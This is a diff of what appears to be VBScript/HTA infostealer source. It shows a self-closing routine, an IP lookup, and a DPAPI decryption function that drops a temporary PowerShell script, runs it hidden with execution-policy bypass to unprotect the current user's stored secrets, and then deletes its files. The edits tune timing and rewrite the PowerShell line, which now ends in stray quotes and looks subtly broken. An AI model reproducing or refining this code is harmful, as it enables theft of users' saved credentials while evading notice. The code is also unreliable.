@@ -34,7 +34,8 @@ For runCount = 1 To 4
     If runCount < 4 Then Call SleepMinutes(5)
 Next
 
-' --- KILL SELF (Removed the fast kill, let it close naturally) ---
+' --- KILL SELF (Changed to 10 seconds) ---
+Call SleepSeconds(10)
 window.close()
 
 ' --- IP Function ---
@@ -140,14 +141,10 @@ Function DecryptDPAPI(b64)
     Dim outf: outf = TmpFile("dpo.txt")
     fso.DeleteFile outf, True
     WriteFile inf, b64
-    
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"""
     Dim psf: psf = TmpFile("dpapi.ps1")
     WriteFile psf, ps
-    
-    ' Increased wait to ensure PowerShell finishes DPAPI before killing
     sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    
     If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
     fso.DeleteFile inf, True
     fso.DeleteFile psf, True
